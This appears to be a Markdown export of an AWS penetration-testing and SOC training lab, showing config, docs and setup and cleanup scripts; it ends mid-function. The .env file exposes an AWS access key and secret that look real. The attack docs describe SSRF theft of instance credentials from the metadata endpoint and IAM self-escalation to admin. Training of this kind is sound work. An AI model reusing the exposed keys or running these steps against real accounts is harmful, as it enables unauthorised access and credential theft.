# AWS Security Lab - Complete Codebase

## File: `.env`
```text
# AWS Security Lab - Environment Configuration
# Rename this file to .env and fill in your values

# AWS Credentials (Required if not configured via AWS CLI)
AWS_ACCESS_KEY_ID=AKIAU6U45JOEUBCSBCUO
AWS_SECRET_ACCESS_KEY=DSGSGMURAwy37fhs+s3va4QvZKZoI4vqEufoLG1p
# AWS_SESSION_TOKEN=optional_session_token_here

# AWS Region (Optional, defaults to us-east-1)
AWS_REGION=eu-north-1

```

## File: `config.py`
```python
"""
AWS Security Lab - Configuration
=================================
Central configuration for all lab components.
"""

import os
import random
import string
from dotenv import load_dotenv
from pathlib import Path

# Load env variables from .env file (robustly find it relative to this file)
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path, override=True)

# Generate a unique suffix for resource names
def generate_suffix(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# Lab Configuration
class Config:
    # AWS Region
    AWS_REGION = os.getenv('AWS_REGION', 'us-east-1')
    
    # Unique prefix for all resources (persistent across runs)
    config_file = Path(__file__).parent / '.lab_config'
    if config_file.exists():
        LAB_PREFIX = config_file.read_text().strip()
    else:
        LAB_PREFIX = f"seclab-{generate_suffix()}"
        config_file.write_text(LAB_PREFIX)
    
    # Resource creation flags
    CREATE_VULNERABLE_RESOURCES = True
    ENABLE_LOGGING = True
    ENABLE_GUARDDUTY = True
    
    # S3 Bucket Names
    S3_PUBLIC_BUCKET = f"{LAB_PREFIX}-public-data"
    S3_UNENCRYPTED_BUCKET = f"{LAB_PREFIX}-unencrypted"
    S3_NO_VERSIONING_BUCKET = f"{LAB_PREFIX}-no-versioning"
    S3_CORS_BUCKET = f"{LAB_PREFIX}-cors-vulnerable"
    S3_SECURE_BUCKET = f"{LAB_PREFIX}-secure-reference"
    S3_CLOUDTRAIL_BUCKET = f"{LAB_PREFIX}-cloudtrail-logs"
    
    # IAM Resource Names
    IAM_OVERPRIVILEGED_USER = f"{LAB_PREFIX}-overprivileged-user"
    IAM_ESCALATION_USER = f"{LAB_PREFIX}-escalation-user"
    IAM_WEAK_TRUST_ROLE = f"{LAB_PREFIX}-weak-trust-role"
    IAM_WILDCARD_ROLE = f"{LAB_PREFIX}-wildcard-role"
    IAM_SECURE_ROLE = f"{LAB_PREFIX}-secure-role"
    
    # EC2 Configuration
    EC2_INSTANCE_TYPE = 't3.micro' # t3 is more widely available in new regions like eu-north-1
    EC2_KEY_NAME = f"{LAB_PREFIX}-keypair"
    EC2_VULNERABLE_SG = f"{LAB_PREFIX}-vulnerable-sg"
    EC2_SECURE_SG = f"{LAB_PREFIX}-secure-sg"
    
    # CloudTrail
    CLOUDTRAIL_NAME = f"{LAB_PREFIX}-trail"
    
    # CloudWatch
    CLOUDWATCH_LOG_GROUP = f"/aws/securitylab/{LAB_PREFIX}"
    
    # Tags for all resources
    COMMON_TAGS = {
        'Project': 'aws-security-lab',
        'Environment': 'lab',
        'Project': 'aws-security-lab',
        'Environment': 'lab',
        # 'Purpose': 'security-training', # Removed to allow specific scripts to define their own purpose without collision
        'ManagedBy': 'python-boto3'
    }
    
    # Sample "sensitive" data for testing
    SAMPLE_CREDENTIALS = """
# SAMPLE CREDENTIALS - NOT REAL
# This file simulates exposed credentials for lab testing

AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

DATABASE_URL=postgresql://admin:password123@db.example.com:5432/production
API_KEY=sk-test-51234567890abcdefghijklmnop
"""
    
    SAMPLE_CONFIG = {
        "database": {
            "host": "db.internal.example.com",
            "port": 5432,
            "username": "app_user",
            "password": "SuperSecret123!"
        },
        "api_keys": {
            "stripe": "sk_test_fake123",
            "sendgrid": "SG.fake_key_here"
        },
        "internal_endpoints": [
            "http://10.0.1.50:8080/admin",
            "http://10.0.1.51:9200/_cluster/health"
        ]
    }

# Create global config instance
config = Config()

```

## File: `export_project.py`
```python
import os
import shutil
import sys
from pathlib import Path

# Setup paths
SOURCE_DIR = Path(r"c:\Users\vetha\.gemini\antigravity\scratch\aws-security-lab")
# Get Desktop path dynamically
DESKTOP = Path(os.environ['USERPROFILE']) / 'Desktop'
DEST_DIR = DESKTOP / "AWS_Security_Lab_Export"

# Extensions to include in the markdown summary
TEXT_EXTENSIONS = {'.py', '.md', '.txt', '.json', '.env', '.gitignore'}
SKIP_DIRS = {'__pycache__', '.git', '.idea', 'venv', 'env', '.gemini'}

def main():
    print(f"Starting export from {SOURCE_DIR} to {DEST_DIR}...")

    # 1. Clear destination if exists
    if DEST_DIR.exists():
        print("Cleaning previous export...")
        shutil.rmtree(DEST_DIR)
    
    DEST_DIR.mkdir(parents=True)

    code_summary = ["# AWS Security Lab - Complete Codebase\n\n"]
    
    file_count = 0

    # 2. Walk and Copy
    for root, dirs, files in os.walk(SOURCE_DIR):
        # Filter directories in-place
        dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
        
        rel_path = Path(root).relative_to(SOURCE_DIR)
        dest_path = DEST_DIR / rel_path
        dest_path.mkdir(exist_ok=True)
        
        for file in files:
            src_file = Path(root) / file
            
            # Skip compiled python files
            if file.endswith('.pyc'):
                continue
                
            # Copy file
            shutil.copy2(src_file, dest_path / file)
            file_count += 1
            
            # Add to markdown summary if text file
            if src_file.suffix in TEXT_EXTENSIONS or file == '.env':
                try:
                    content = src_file.read_text(encoding='utf-8', errors='ignore')
                    code_summary.append(f"## File: `{rel_path / file}`\n")
                    # Determine language for markdown
                    lang = 'python' if src_file.suffix == '.py' else \
                           'json' if src_file.suffix == '.json' else \
                           'bash' if src_file.suffix == '.sh' else \
                           'text'
                    
                    code_summary.append(f"```{lang}\n{content}\n```\n\n")
                except Exception as e:
                    print(f"Skipping summary for {file}: {e}")

    # 3. Write Summary File
    summary_path = DEST_DIR / "COMPLETE_CODEBASE.md"
    summary_path.write_text("".join(code_summary), encoding='utf-8')
    
    print(f"\n[SUCCESS] Exported {file_count} files.")
    print(f"[SUCCESS] Codebase summary saved to: {summary_path}")
    print(f"Location: {DEST_DIR}")

if __name__ == "__main__":
    main()

```

## File: `README.md`
```text
# AWS Cloud Security Lab - Python Edition 🔐

A comprehensive hands-on security lab for learning AWS penetration testing and SOC operations - **Built entirely in Python**.

## 🎯 Purpose

This lab provides a **safe, controlled environment** to:
- **Attack**: Practice penetration testing against intentionally vulnerable AWS resources
- **Defend**: Learn SOC operations, log analysis, and incident response
- **Remediate**: Implement security controls and automated fixes

## 📁 Project Structure

```
aws-security-lab/
├── infrastructure/           # Python scripts to create vulnerable AWS setup
│   ├── setup_vulnerable_s3.py
│   ├── setup_vulnerable_iam.py
│   ├── setup_vulnerable_ec2.py
│   ├── setup_logging.py
│   └── cleanup.py
├── penetration-testing/      # Attack scripts
│   ├── s3-enumeration/
│   ├── iam-escalation/
│   └── ec2-metadata/
├── soc-defense/              # Defense and monitoring
│   ├── log-analysis/
│   ├── alerting-rules/
│   ├── playbooks/
│   └── remediation/
├── utils/                    # Helper scripts
│   ├── check_permissions.py
│   └── verify_credentials.py
├── docs/                     # Lab guides
├── requirements.txt
└── config.py
```

## ⚠️ Warning

> **EDUCATIONAL USE ONLY** - This lab creates intentionally vulnerable resources.
> - Use a **dedicated AWS sandbox account**
> - **Destroy resources** after use to avoid charges
> - **Never deploy** in production environments

## 🚀 Quick Start

### Prerequisites
- AWS Account with admin access
- AWS CLI configured (`aws configure`)
- Python 3.9+

### Installation
```bash
pip install -r requirements.txt
```

### Deploy Vulnerable Infrastructure
```bash
# Create all vulnerable resources
python infrastructure/deploy_all.py

# Or create individually:
python infrastructure/setup_vulnerable_s3.py
python infrastructure/setup_vulnerable_iam.py
python infrastructure/setup_vulnerable_ec2.py
```

### Run Penetration Tests
```bash
python penetration-testing/s3-enumeration/s3_enum.py
python penetration-testing/iam-escalation/iam_escalation.py
python penetration-testing/ec2-metadata/ec2_metadata.py
```

### Monitor & Defend
```bash
python soc-defense/log-analysis/log_analyzer.py
python soc-defense/remediation/auto_remediate.py
```

### Cleanup (IMPORTANT!)
```bash
python infrastructure/cleanup.py
```

### Verification & Troubleshooting
Use the helper scripts in `utils/` to debug issues:
```bash
python utils/verify_credentials.py  # Check .env keys
python utils/check_permissions.py   # Check IAM capabilities
```

## 📚 Documentation

- [Lab Guide](docs/lab-guide.md) - Step-by-step instructions
- [Walkthrough](docs/walkthrough.md) - Troubleshooting and deployment fixes
- [Attack Scenarios](docs/attack-scenarios.md) - Penetration testing walkthroughs
- [Defense Scenarios](docs/defense-scenarios.md) - SOC response procedures

## 🔬 Lab Modules

| Module | Description |
|--------|-------------|
| S3 Security | Bucket enumeration, ACL exploitation, data exposure |
| IAM Security | Privilege escalation, policy abuse, credential theft |
| EC2 Security | Metadata service attacks, SSRF, instance compromise |
| CloudTrail | Log analysis, threat detection, forensics |
| Remediation | Automated security fixes, incident response |

## 📝 License

This project is for educational purposes only.

```

## File: `requirements.txt`
```text
boto3>=1.34.0
botocore>=1.34.0
colorama>=0.4.6
tabulate>=0.9.0
requests>=2.31.0
python-dateutil>=2.8.2
rich>=13.7.0
click>=8.1.7
flask>=2.3.0
python-dotenv>=1.0.0


```

## File: `docs\attack-scenarios.md`
```text
# Attack Scenarios

## Scenario 1: S3 Bucket Enumeration
**Objective**: Find exposed sensitive data in S3 buckets.

1.  Run the enumeration tool:
    ```bash
    python penetration-testing/s3-enumeration/s3_enum.py
    ```
2.  **Observe**:
    - Which buckets are marked as "Public"?
    - Did the tool find any "SENSITIVE" files like `credentials.txt`?
3.  **Exploit**:
    - Try to download the `credentials.txt` file manually or using the AWS CLI.
    - `aws s3 cp s3://<bucket-name>/backup/credentials.txt .`

## Scenario 2: IAM Privilege Escalation
**Objective**: Escalate from a limited user to Admin.

1.  Run the escalation tool:
    ```bash
    python penetration-testing/iam-escalation/iam_escalation.py
    ```
2.  **Observe**:
    - The tool maps permissions for the current user.
    - Look for "Escalation Opportunities".
3.  **Exploit**:
    - If you see `iam:AttachUserPolicy`, you can attach `AdministratorAccess` to your own user!
    - The tool identifies this path.

## Scenario 3: EC2 SSRF & Metadata Theft
**Objective**: Steal IAM credentials using an SSRF vulnerability.

*Note: This requires access to the running EC2 instance's web app.*

1.  Run the metadata exploiter (in "Demo Mode" if local, or on the instance):
    ```bash
    python penetration-testing/ec2-metadata/ec2_metadata.py
    ```
2.  **Understand the Attack**:
    - The web app takes a URL parameter: `http://<ip>/fetch?url=...`
    - Attacker points it to: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
    - The server returns the IAM role credentials!
3.  **Impact**:
    - With these credentials (Access Key, Secret Key, Token), an attacker acts *as* that EC2 instance.

```

## File: `docs\defense-scenarios.md`
```text
# Defense Scenarios

## Scenario 1: Log Analysis & Threat Detection
**Objective**: Detect the attacks performed in the previous phase.

1.  Run the log analyzer:
    ```bash
    python soc-defense/log-analysis/log_analyzer.py
    ```
2.  **Analyze**:
    - Look for "Suspicious Events" in the report.
    - **Reconnaissance**: Did you see `ListBuckets` or `GetCallerIdentity`?
    - **Unauthorized Access**: Are there 403 Access Denied errors?
    - **S3 Public Access**: Look for `PutBucketPolicy` or `PutBucketAcl`.

## Scenario 2: Automated Remediation
**Objective**: Fix the vulnerabilities automatically.

1.  **Dry Run**: See what *would* be fixed without changing anything.
    ```bash
    python soc-defense/remediation/auto_remediate.py --dry-run
    ```
2.  **Verified Fixes**: Run the tool to apply security controls.
    ```bash
    python soc-defense/remediation/auto_remediate.py
    ```
3.  **Verify**:
    - Go back to the AWS Console (or run attack scripts again).
    - S3 buckets should now block public access.
    - IAM users should have dangerous policies removed.
    - EC2 Security Groups should no longer allow 0.0.0.0/0.

## Scenario 3: Alerting (Bonus)
The lab sets up CloudWatch metric filters and alarms.

1.  Check `soc-defense/alerting-rules/cloudwatch_alerts.json` to see defined alerts.
2.  If you subscribed your email to the SNS topic, check your inbox!
3.  Trigger an alert by creating a new IAM user or changing a bucket policy manually.

```

## File: `docs\lab-guide.md`
```text
# AWS Security Lab - Lab Guide

## 🏁 Getting Started

Welcome to the AWS Security Lab! This guide will help you set up your environment, run the lab, and learn from it.

### Prerequisites
1.  **AWS Account**: A dedicated sandbox account. **DO NOT USE PRODUCTION!**
2.  **AWS CLI**: Install and configure with `aws configure`.
3.  **Python 3.9+**: Ensure you have Python installed.

### Setup
1.  Install dependencies:
    ```bash
    pip install -r requirements.txt
    ```

2.  Deploy the infrastructure:
    ```bash
    python infrastructure/deploy_all.py
    ```
    *This will take a few minutes to create S3 buckets, IAM users, EC2 instances, and logging.*

---

## 🏗️ Architecture Overview

The lab creates the following resources:

### 1. S3 Buckets
- `seclab-xxx-public-data`: Publicly accessible (Vulnerable)
- `seclab-xxx-unencrypted`: No encryption (Vulnerable)
- `seclab-xxx-cors-vulnerable`: Permissive CORS (Vulnerable)
- `seclab-xxx-secure-reference`: Secure bucket example

### 2. IAM Resources
- `seclab-xxx-overprivileged-user`: Has admin-like permissions.
- `seclab-xxx-escalation-user`: Can escalate privileges.
- `seclab-xxx-weak-trust-role`: Can be assumed by anyone.

### 3. EC2 Instance
- `seclab-xxx-vulnerable-instance`: Runs a web app with SSRF vulnerability and has IMDSv1 enabled.

---

## 🧪 Running the Lab

Follow the **Attack Scenarios** to exploit these vulnerabilities, then use the **Defense Scenarios** to detect and fix them.

---

## 🧹 Cleanup

**CRITICAL**: Always clean up multiple times if needed to ensure no costs are incurred.

```bash
python infrastructure/cleanup.py
```

```

## File: `docs\walkthrough.md`
```text
# AWS Security Lab - Walkthrough

## 1. Project Overview
This project sets up a **vulnerable AWS environment** for security training. It includes:
*   **Vulnerable EC2**: IMDSv1 enabled, open Security Groups, SSRF-vulnerable web app.
*   **Vulnerable S3**: Public buckets, unencrypted data.
*   **Vulnerable IAM**: Overprivileged users and roles.
*   **Defense**: Logging (CloudTrail, GuardDuty), Alerting (CloudWatch), and **Automated Remediation**.

## 2. Infrastructure Setup
The infrastructure is deployed using Python `boto3`.

### Key Scripts
*   `infrastructure/deploy_all.py`: Orchestrates the entire setup.
*   `config.py`: Central configuration. **Updated to use persistence (`.lab_config`) to ensure consistent naming.**
*   `infrastructure/setup_vulnerable_ec2.py`: Creates the vulnerable instance. **Fixed syntax errors and updated to `t3.micro`.**

## 3. How to Use

### Step 1: Deploy Infrastructure
```powershell
python infrastructure/deploy_all.py
```
*Wait for "Setup complete!"*

### Step 2: Attack (Penetration Testing)
Explore the vulnerabilities:
*   Check S3 buckets for open data.
*   Try the SSRF attack on the EC2 instance URL.

### Step 3: Defend (Remediation)
Run the auto-remediation tool to fix the vulnerabilities:
```powershell
python soc-defense/remediation/auto_remediate.py
```
*Use `--dry-run` solely to see what would be fixed.*

### Step 4: Cleanup
**Important:** Delete resources to avoid charges.
```powershell
python infrastructure/cleanup.py
```

## 4. Troubleshooting Tools
*   `utils/verify_credentials.py`: Check if your `.env` keys are valid.
*   `utils/check_permissions.py`: Check if your IAM user has enough permissions (S3/IAM).

```

## File: `infrastructure\cleanup.py`
```python
"""
Cleanup Script
==============
Removes all AWS resources created by the security lab.

IMPORTANT: Run this when you're done to avoid ongoing charges!
"""

import boto3
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import config

from rich.console import Console
from rich.panel import Panel
from rich.prompt import Confirm
from rich.progress import Progress

console = Console()


def delete_s3_buckets(s3_client, s3_resource):
    """Delete all lab S3 buckets"""
    buckets = [
        config.S3_PUBLIC_BUCKET,
        config.S3_UNENCRYPTED_BUCKET,
        config.S3_NO_VERSIONING_BUCKET,
        config.S3_CORS_BUCKET,
        config.S3_SECURE_BUCKET,
        config.S3_CLOUDTRAIL_BUCKET
    ]
    
    console.print("\n[bold cyan]Deleting S3 Buckets...[/]")
    
    for bucket_name in buckets:
        try:
            # First, delete all objects in the bucket
            bucket = s3_resource.Bucket(bucket_name)
            bucket.objects.all().delete()
            bucket.object_versions.all().delete()
            
            # Then delete the bucket
            s3_client.delete_bucket(Bucket=bucket_name)
            console.print(f"  [green]✓[/] Deleted: {bucket_name}")
        except s3_client.exceptions.NoSuchBucket:
            console.print(f"  [dim]- Not found: {bucket_name}[/]")
        except Exception as e:
            console.print(f"  [red]✗ Error deleting {bucket_name}:[/] {str(e)}")


def delete_iam_resources(iam_client):
    """Delete all lab IAM users and roles"""
    console.print("\n[bold cyan]Deleting IAM Resources...[/]")
    
    # Delete users
    users = [config.IAM_OVERPRIVILEGED_USER, config.IAM_ESCALATION_USER]
    for user_name in users:
        try:
            # Delete inline policies
            policies = iam_client.list_user_policies(UserName=user_name)
            for policy_name in policies.get('PolicyNames', []):
                iam_client.delete_user_policy(UserName=user_name, PolicyName=policy_name)
            
            # Delete attached policies
            attached = iam_client.list_attached_user_policies(UserName=user_name)
            for policy in attached.get('AttachedPolicies', []):
                iam_client.detach_user_policy(UserName=user_name, PolicyArn=policy['PolicyArn'])
            
            # Delete access keys
            keys = iam_client.list_access_keys(UserName=user_name)
            for key in keys.get('AccessKeyMetadata', []):
                iam_client.delete_access_key(UserName=user_name, AccessKeyId=key['AccessKeyId'])
            
            # Delete user
            iam_client.delete_user(UserName=user_name)
            console.print(f"  [green]✓[/] Deleted user: {user_name}")
        except iam_client.exceptions.NoSuchEntityException:
            console.print(f"  [dim]- User not found: {user_name}[/]")
        except Exception as e:
            console.print(f"  [red]✗ Error deleting {user_name}:[/] {str(e)}")
    
    # Delete roles
    roles = [config.IAM_WEAK_TRUST_ROLE, config.IAM_WILDCARD_ROLE, config.IAM_SECURE_ROLE]
    for role_name in roles:
        try:
            # Delete inline policies
            policies = iam_client.list_role_policies(RoleName=role_name)
            for policy_name in policies.get('PolicyNames', []):
                iam_client.delete_role_policy(RoleName=role_name, PolicyName=policy_name)
            
            # Delete attached policies
            attached = iam_client.list_attached_role_policies(RoleName=role_name)
            for policy in attached.get('AttachedPolicies', []):
                iam_client.detach_role_policy(RoleName=role_name, PolicyArn=policy['PolicyArn'])
            
            # Delete role
            iam_client.delete_role(RoleName=role_name)
            console.print(f"  [green]✓[/] Deleted role: {role_name}")
        except iam_client.exceptions.NoSuchEntityException:
            console.print(f"  [dim]- Role not found: {role_name}[/]")
        except Exception as e:
            console.print(f"  [red]✗ Error deleting {role_name}:[/] {str(e)}")


def delete_ec2_resources(ec2_client):
    """Delete all lab EC2 instances and security groups"""
    console.print("\n[bold cyan]Deleting EC2 Resources...[/]")
    
    # Find and terminate instances with our tags
    try:
        instances = ec2_client.describe_instances(
            Filters=[
                {'Name': 'tag:Project', 'Values': ['aws-security-lab']},
                {'Name': 'instance-state-name', 'Values': ['running', 'stopped', 'pending']}
            ]
        )
        
        instance_ids = []
        for reservation in instances['Reservations']:
            for instance in reservation['Instances']:
                instance_ids.append(instance['InstanceId'])
        
        if instance_ids:
            ec2_client.terminate_instances(InstanceIds=instance_ids)
            console.print(f"  [green]✓[/] Terminated instances: {', '.join(instance_ids)}")
            
            # Wait for termination
            waiter = ec2_client.get_waiter('instance_terminated')
            console.print("  [dim]Waiting for instances to terminate...[/]")
            waiter.wait(InstanceIds=instance_ids)
        else:
            console.print("  [dim]- No instances found[/]")
            
    except Exception as e:
        console.print(f"  [red]✗ Error with instances:[/] {str(e)}")
    
    # Delete security groups
    sg_names = [config.EC2_VULNERABLE_SG, config.EC2_SECURE_SG]
    for sg_name in sg_names:
        try:
            sgs = ec2_client.describe_security_groups(
                Filters=[{'Name': 'group-name', 'Values': [sg_name]}]
            )
            for sg in sgs['SecurityGroups']:
                ec2_client.delete_security_group(GroupId=sg['GroupId'])
                console.print(f"  [green]✓[/] Deleted security group: {sg_name}")
        except Exception as e:
            if 'does not exist' in str(e).lower():
                console.print(f"  [dim]- Not found: {sg_name}[/]")
            else:
                console.print(f"  [red]✗ Error deleting {sg_name}:[/] {str(e)}")


def delete_cloudtrail(cloudtrail_client):
    """Delete CloudTrail"""
    console.print("\n[bold cyan]Deleting CloudTrail...[/]")
    
    try:
        cloudtrail_client.stop_logging(Name=config.CLOUDTRAIL_NAME)
        cloudtrail_client.delete_trail(Name=config.CLOUDTRAIL_NAME)
        console.print(f"  [green]✓[/] Deleted: {config.CLOUDTRAIL_NAME}")
    except cloudtrail_client.exceptions.TrailNotFoundException:
        console.print(f"  [dim]- Not found: {config.CLOUDTRAIL_NAME}[/]")
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")


def delete_cloudwatch_logs(logs_client):
    """Delete CloudWatch Log Group"""
    console.print("\n[bold cyan]Deleting CloudWatch Logs...[/]")
    
    try:
        logs_client.delete_log_group(logGroupName=config.CLOUDWATCH_LOG_GROUP)
        console.print(f"  [green]✓[/] Deleted: {config.CLOUDWATCH_LOG_GROUP}")
    except logs_client.exceptions.ResourceNotFoundException:
        console.print(f"  [dim]- Not found: {config.CLOUDWATCH_LOG_GROUP}[/]")
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")


def delete_guardduty(guardduty_client):
    """Delete GuardDuty detector"""
    console.print("\n[bold cyan]Deleting GuardDuty...[/]")
    
    try:
        detectors = guardduty_client.list_detectors()
        for detector_id in detectors.get('DetectorIds', []):
            # Check if it's our detector by tags
            guardduty_client.delete_detector(DetectorId=detector_id)
            console.print(f"  [green]✓[/] Deleted detector: {detector_id}")
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")


def main():
    console.print(Panel.fit(
        "[bold yellow]🧹 AWS SECURITY LAB CLEANUP 🧹[/]\n\n"
        "This will DELETE all resources created by the security lab:\n"
        "• S3 buckets and all their contents\n"
        "• IAM users, roles, and policies\n"
        "• EC2 instances and security groups\n"
        "• CloudTrail, CloudWatch logs, and GuardDuty\n\n"
        "[red]This action CANNOT be undone![/]",
        title="Cleanup",
        border_style="yellow"
    ))
    
    if not Confirm.ask("\n[bold red]Are you SURE you want to delete all resources?[/]"):
        console.print("[yellow]Cleanup cancelled.[/]")
        return
    
    # Create clients
    s3_client = boto3.client('s3', region_name=config.AWS_REGION)
    s3_resource = boto3.resource('s3', region_name=config.AWS_REGION)
    iam_client = boto3.client('iam', region_name=config.AWS_REGION)
    ec2_client = boto3.client('ec2', region_name=config.AWS_REGION)
    cloudtrail_client = boto3.client('cloudtrail', region_name=config.AWS_REGION)
    logs_client = boto3.client('logs', region_name=config.AWS_REGION)
    guardduty_client = boto3.client('guardduty', region_name=config.AWS_REGION)
    
    # Delete all resources
    delete_cloudtrail(cloudtrail_client)
    delete_ec2_resources(ec2_client)
    delete_iam_resources(iam_client)
    delete_s3_buckets(s3_client, s3_resource)
    delete_cloudwatch_logs(logs_client)
    delete_guardduty(guardduty_client)
    
    console.print("\n" + "="*60)
    console.print(Panel.fit(
        "[bold green]✓ CLEANUP COMPLETE[/]\n\n"
        "All security lab resources have been removed.\n"
        "Check your AWS Console to verify.",
        title="Done",
        border_style="green"
    ))


if __name__ == "__main__":
    main()

```

## File: `infrastructure\deploy_all.py`
```python
"""
Deploy All Infrastructure
=========================
Master script to deploy all vulnerable infrastructure components.
"""

import sys
import os
import boto3
import subprocess

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import config

from rich.console import Console
from rich.panel import Panel
from rich.prompt import Confirm

console = Console()

def check_credentials():
    """Verify AWS credentials before starting"""
    try:
        boto3.client('sts').get_caller_identity()
        return True
    except Exception as e:
        console.print(Panel.fit(
            f"[bold red]Authentication Failed![/]\n"
            f"Error: {str(e)}\n\n"
            "[yellow]Troubleshooting:[/]\n"
            "1. Check your .env file credentials\n"
            "2. Ensure keys are active and not expired\n"
            "3. If using temporary credentials, check AWS_SESSION_TOKEN",
            title="Credential Error",
            border_style="red"
        ))
        return False


def main():
    console.print(Panel.fit(
        "[bold red]⚠️  AWS SECURITY LAB DEPLOYMENT  ⚠️[/]\n\n"
        "This will create:\n"
        "• Vulnerable S3 buckets (public access, no encryption)\n"
        "• Vulnerable IAM users/roles (privilege escalation paths)\n"
        "• Vulnerable EC2 instances (open security groups, IMDSv1)\n"
        "• Logging infrastructure (CloudTrail, GuardDuty)\n\n"
        "[yellow]WARNING: These resources are intentionally insecure![/]\n"
        "[yellow]Use only in a dedicated sandbox AWS account.[/]",
        title="AWS Security Lab",
        border_style="red"
    ))
    
    if not check_credentials():
        return

    if not Confirm.ask("\n[bold]Do you want to proceed with deployment?[/]"):
        console.print("[yellow]Deployment cancelled.[/]")
        return
    
    # Check for alerts definition file
    alerts_file = os.path.join(os.path.dirname(__file__), '../soc-defense/alerting-rules/cloudwatch_alerts.json')
    if not os.path.exists(alerts_file):
         console.print(f"[yellow]Warning: Alert definitions not found at {alerts_file}[/]")

    
    console.print("\n" + "="*60)
    console.print("[bold cyan]Phase 1: Setting up Logging & Detection[/]")
    console.print("="*60)
    
    from infrastructure.setup_logging import main as setup_logging
    setup_logging()
    
    console.print("\n" + "="*60)
    console.print("[bold red]Phase 2: Creating Vulnerable S3 Buckets[/]")
    console.print("="*60)
    
    from infrastructure.setup_vulnerable_s3 import main as setup_s3
    setup_s3()
    
    console.print("\n" + "="*60)
    console.print("[bold red]Phase 3: Creating Vulnerable IAM Resources[/]")
    console.print("="*60)
    
    from infrastructure.setup_vulnerable_iam import main as setup_iam
    setup_iam()
    
    console.print("\n" + "="*60)
    console.print("[bold red]Phase 4: Creating Vulnerable EC2 Resources[/]")
    console.print("="*60)
    
    from infrastructure.setup_vulnerable_ec2 import main as setup_ec2
    setup_ec2()
    
    console.print("\n" + "="*60)
    console.print("[bold cyan]Phase 5: Deploying Alerting Rules[/]")
    console.print("="*60)
    
    try:
        # Since setup_alerts.py is in a subdirectory, we might need to adjust import or path
        # Simpler approach: execute it or import directly if path allows
        # Given the structure, we can import if we add the root to path (already done)
        # Use subprocess to run the script because 'soc-defense' has a hyphen and can't be imported easily

        
        alert_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'soc-defense', 'alerting-rules', 'setup_alerts.py')
        
        if os.path.exists(alert_script):
            subprocess.run([sys.executable, alert_script], check=True)
            console.print("[green]✓ Alerts deployed[/]")
        else:
             console.print(f"[yellow]Warning: Alert script not found at {alert_script}[/]")

    except subprocess.CalledProcessError as e:
        console.print(f"[red]✗ Alert deployment failed with exit code {e.returncode}[/]")
    except Exception as e:
        console.print(f"[yellow]Could not auto-deploy alerts: {str(e)}[/]")
        console.print("Run manually: [cyan]python soc-defense/alerting-rules/setup_alerts.py[/]")
    
    console.print("\n" + "="*60)
    console.print(Panel.fit(
        "[bold green]✓ DEPLOYMENT COMPLETE[/]\n\n"
        "Next steps:\n"
        "1. Run penetration tests: [cyan]python penetration-testing/<module>/[/]\n"
        "2. Analyze logs: [cyan]python soc-defense/log-analysis/log_analyzer.py[/]\n"
        "3. Run auto-remediation: [cyan]python soc-defense/remediation/auto_remediate.py --dry-run[/]\n"
        "4. Clean up when done: [cyan]python infrastructure/cleanup.py[/]",
        title="Success",
        border_style="green"
    ))


if __name__ == "__main__":
    main()

```

## File: `infrastructure\setup_logging.py`
```python
"""
CloudTrail and Logging Setup
============================
Sets up AWS logging infrastructure for SOC monitoring.

CREATES:
1. CloudTrail for API logging
2. CloudWatch Log Groups
3. GuardDuty for threat detection
4. SNS topic for alerts
"""

import boto3
import json
import sys
import os
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import config

from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()


def get_account_id():
    """Get current AWS account ID"""
    sts = boto3.client('sts')
    return sts.get_caller_identity()['Account']


def create_cloudtrail_bucket(s3_client, account_id):
    """Create S3 bucket for CloudTrail logs"""
    bucket_name = config.S3_CLOUDTRAIL_BUCKET
    console.print(f"\n[bold cyan]Creating CloudTrail log bucket:[/] {bucket_name}")
    
    try:
        if config.AWS_REGION == 'us-east-1':
            s3_client.create_bucket(Bucket=bucket_name)
        else:
            s3_client.create_bucket(
                Bucket=bucket_name,
                CreateBucketConfiguration={'LocationConstraint': config.AWS_REGION}
            )
        
        # CloudTrail bucket policy
        bucket_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "AWSCloudTrailAclCheck",
                    "Effect": "Allow",
                    "Principal": {"Service": "cloudtrail.amazonaws.com"},
                    "Action": "s3:GetBucketAcl",
                    "Resource": f"arn:aws:s3:::{bucket_name}"
                },
                {
                    "Sid": "AWSCloudTrailWrite",
                    "Effect": "Allow",
                    "Principal": {"Service": "cloudtrail.amazonaws.com"},
                    "Action": "s3:PutObject",
                    "Resource": f"arn:aws:s3:::{bucket_name}/AWSLogs/{account_id}/*",
                    "Condition": {
                        "StringEquals": {"s3:x-amz-acl": "bucket-owner-full-control"}
                    }
                }
            ]
        }
        
        s3_client.put_bucket_policy(Bucket=bucket_name, Policy=json.dumps(bucket_policy))
        
        # Enable encryption
        s3_client.put_bucket_encryption(
            Bucket=bucket_name,
            ServerSideEncryptionConfiguration={
                'Rules': [{'ApplyServerSideEncryptionByDefault': {'SSEAlgorithm': 'AES256'}}]
            }
        )
        
        s3_client.put_bucket_tagging(
            Bucket=bucket_name,
            Tagging={'TagSet': [
                {'Key': 'Purpose', 'Value': 'cloudtrail-logs'},
                *[{'Key': k, 'Value': v} for k, v in config.COMMON_TAGS.items()]
            ]}
        )
        
        console.print(f"  [green]✓[/] Bucket created with CloudTrail permissions")
        return bucket_name
        
    except s3_client.exceptions.BucketAlreadyOwnedByYou:
        console.print(f"  [yellow]! Bucket already exists[/]")
        return bucket_name
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return None


def create_cloudtrail(cloudtrail_client, bucket_name):
    """Create CloudTrail for API logging"""
    trail_name = config.CLOUDTRAIL_NAME
